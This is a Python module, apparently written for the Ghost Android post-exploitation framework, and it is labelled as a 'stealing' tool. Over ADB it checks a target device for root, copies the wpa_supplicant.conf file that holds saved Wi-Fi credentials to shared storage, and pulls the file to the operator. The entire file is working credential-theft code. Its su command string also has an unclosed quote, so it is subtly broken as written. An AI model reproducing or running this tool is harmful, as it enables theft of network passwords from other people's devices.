
#!/usr/bin/env python3

# Valentin Lobstein 2022
# Default Project : https://github.com/EntySec/Ghost

from core.badges import badges
from core.ghost import ghost

class GhostModule:
    def __init__(self):
        self.badges = badges()
        self.ghost = ghost()

        self.name = "wpa_supplicant"
        self.description = "Get wpa supplicant configuration file."
        self.usage = "Usage: wpa_supplicant <output>"
        self.type = "stealing"
        self.args = 2

    def run(self, cmd_data):
        print(self.badges.G + "Checking if device is rooted...")
        output = self.ghost.send_command("shell", "su")
        if "inaccessible" in output or "not found" in output:
            print(self.badges.E + "Target System is not rooted [FAILED]")
        else:
            print(self.badges.G + "Getting wpa supplicant configuration file...")
            output = self.ghost.send_command("shell", "su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/")
            output = self.ghost.send_command("pull", f"/sdcard/wpa_supplicant.conf {cmd_data.split(' ')[0]}")
            print(output)